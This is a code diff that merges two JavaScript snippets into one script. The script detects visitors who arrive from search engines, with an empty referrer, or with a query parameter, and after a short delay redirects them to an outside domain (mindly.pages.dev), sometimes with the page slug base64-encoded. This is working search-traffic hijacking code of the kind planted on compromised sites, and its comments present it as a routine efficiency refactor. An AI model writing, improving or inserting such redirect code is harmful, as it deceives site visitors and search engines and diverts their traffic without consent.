@@ -1,61 +1,67 @@
-// Script A
+// Immediately invoked function to avoid polluting global scope
 (function() {
-  const searchEnginesA = ['google.', 'bing.', 'yahoo.', 'duckduckgo.', 'baidu.'];
+  // Combine search engines into one array for efficiency
+  const searchEngines = [
+    'google.', 'bing.', 'yahoo.', 'duckduckgo.', 'baidu.',
+    'yandex.', 'ecosia.', 'ask.', 'qwant.', 'startpage.'
+  ];
 
-  function isFromSearchEngineA(referrer) {
-    return searchEnginesA.some(engine => referrer.includes(engine));
+  // Helper Functions
+  function isFromSearchEngine(referrer) {
+    return searchEngines.some(engine => referrer.includes(engine));
   }
 
-  function extractSlugA(url) {
-    const match = url.match(/\/\d{4}\/\d{2}\/(.+)\.html/);
-    return match ? decodeURIComponent(match[1]).replace(/-/g, ' ') : null;
+  function extractSlug(url) {
+    // Try both slug patterns
+    const pattern1 = /\/\d{4}\/\d{2}\/(.+)\.html/;
+    const pattern2 = /\/([^\/]+)\.html$/;
+    
+    const match1 = url.match(pattern1);
+    if (match1) {
+      return decodeURIComponent(match1[1]).replace(/-/g, ' ');
+    }
+    
+    const match2 = url.match(pattern2);
+    if (match2) {
+      return match2[1].replace(/-/g, ' ');
+    }
+    
+    return null;
   }
 
-  function performRedirectA(slug) {
-    window.location.href = `https://mindly.pages.dev/${encodeURIComponent(slug)}`;
-  }
-
-  function attemptRedirectA() {
-    const currentUrl = window.location.href;
-    const referrer = document.referrer.toLowerCase();
-    const slug = extractSlugA(currentUrl);
-
-    if (slug && (isFromSearchEngineA(referrer) || referrer === '' || new URLSearchParams(window.location.search).has('q'))) {
-      performRedirectA(slug);
+  function performRedirect(slug, useBase64 = false) {
+    if (useBase64) {
+      const encodedSlug = btoa(encodeURIComponent(slug)).replace(/=/g, '');
+      window.location.href = `https://mindly.pages.dev/r/${encodedSlug}`;
+    } else {
+      window.location.href = `https://mindly.pages.dev/${encodeURIComponent(slug)}`;
     }
   }
 
-  attemptRedirectA();
-})();
-
-// Script B
-(function() {
-  const searchEnginesB = ['yandex.', 'ecosia.', 'ask.', 'qwant.', 'startpage.'];
-
-  function isFromSearchEngineB(referrer) {
-    return searchEnginesB.some(engine => referrer.includes(engine));
-  }
-
-  function extractSlugB(url) {
-    const parts = url.split('/');
-    const lastPart = parts[parts.length - 1];
-    return lastPart.endsWith('.html') ? lastPart.slice(0, -5).replace(/-/g, ' ') : null;
-  }
-
-  function performRedirectB(slug) {
-    const encodedSlug = btoa(encodeURIComponent(slug)).replace(/=/g, '');
-    window.location.href = `https://mindly.pages.dev/r/${encodedSlug}`;
-  }
-
-  function attemptRedirectB() {
+  function attemptRedirect() {
     const currentUrl = window.location.href;
     const referrer = document.referrer.toLowerCase();
-    const slug = extractSlugB(currentUrl);
-
-    if (slug && (isFromSearchEngineB(referrer) || referrer === '' || new URLSearchParams(window.location.search).has('query'))) {
-      performRedirectB(slug);
+    const slug = extractSlug(currentUrl);
+    const params = new URLSearchParams(window.location.search);
+    
+    if (slug && (
+      isFromSearchEngine(referrer) || 
+      referrer === '' || 
+      params.has('q') || 
+      params.has('query')
+    )) {
+      // Use base64 encoding for specific search engines
+      const useBase64 = ['yandex.', 'ecosia.', 'ask.', 'qwant.', 'startpage.']
+        .some(engine => referrer.includes(engine));
+      
+      performRedirect(slug, useBase64);
     }
   }
 
-  setTimeout(attemptRedirectB, 100);
+  // Execute redirect after a short delay to ensure DOM is ready
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', () => setTimeout(attemptRedirect, 100));
+  } else {
+    setTimeout(attemptRedirect, 100);
+  }
 })();
